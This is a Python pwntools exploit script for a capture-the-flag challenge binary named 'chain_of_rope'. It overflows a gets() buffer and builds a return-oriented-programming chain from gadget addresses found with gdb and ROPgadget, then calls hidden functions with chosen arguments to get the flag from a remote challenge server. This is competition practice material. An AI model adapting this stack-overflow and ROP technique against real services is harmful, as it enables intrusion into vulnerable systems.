from pwn import *

"""
(gdb) info add authorize
Symbol "authorize" is at 0x401196 in a file compiled without debugging.
(gdb) info add main     
Symbol "main" is at 0x401278 in a file compiled without debugging.
(gdb) info add addBalance
Symbol "addBalance" is at 0x4011ab in a file compiled without debugging.
(gdb) info add flag      
Symbol "flag" is at 0x4011eb in a file compiled without debugging.
(gdb) info add getInfo
Symbol "getInfo" is at 0x401252 in a file compiled without debugging.
(gdb) 
"""
addr_authorize = p64(0x401196)
addr_main = p64(0x401278)
addr_addBalance = p64(0x4011ab)
addr_flag = p64(0x4011eb)
addr_getInfo = p64(0x401252)

"""
$ ROPgadget --binary ./chain_of_rope | grep 'pop rdi'
0x0000000000401403 : pop rdi ; ret
$ ROPgadget --binary ./chain_of_rope | grep 'pop rsi'
0x0000000000401401 : pop rsi ; pop r15 ; ret
"""
addr_pop_rdi = p64(0x0401403)
addr_pop_rsi_pop_r15 = p64(0x401401)

#############################################


def test():
	p = process("./chain_of_rope")

	# 1. call authorize(void)
	print(p.recvuntil("3 - Grant access"))
	p.sendline('1')  # 1 - Set name

	offset = 48 + 8
	payload = cyclic(offset)
	payload = addr_getInfo * ((offset // 8) + 1)
	payload += addr_authorize
	payload += addr_getInfo
	payload += addr_main
	payload += addr_flag
	p.sendline(payload)


def main():
	# core = Coredump('./core')
	# p = process("./chain_of_rope")
	p = remote("shell.actf.co", 19400)

	# Go to vulnerabble gets() function
	print(p.recvuntil("3 - Grant access"))
	p.sendline('1')  # 1 - Set name

	# Offset to control RIP
	offset = 48 + 8
	payload = cyclic(offset)

	# 1. call authorize(void)
	payload += addr_authorize

	# 2. call addBalance(0xdeadbeef)
	payload += addr_pop_rdi + p64(0xdeadbeef) # pop rdi for param1
	payload += addr_addBalance
	# payload += addr_getInfo  # test

	# 3. call flag(0xba5eba11, 0xbedabb1e)
	payload += addr_pop_rdi + p64(0xba5eba11)
	# pop rdi for param1
	payload += addr_pop_rsi_pop_r15 + p64(0xbedabb1e) + p64(0)
	# pop rsi for param2, pop r15 (unused) for dummy address
	payload += addr_flag

	# ?
	payload += addr_main
	p.sendline(payload)

	while True:
		print(p.recvline())

if __name__ == '__main__':
	main()
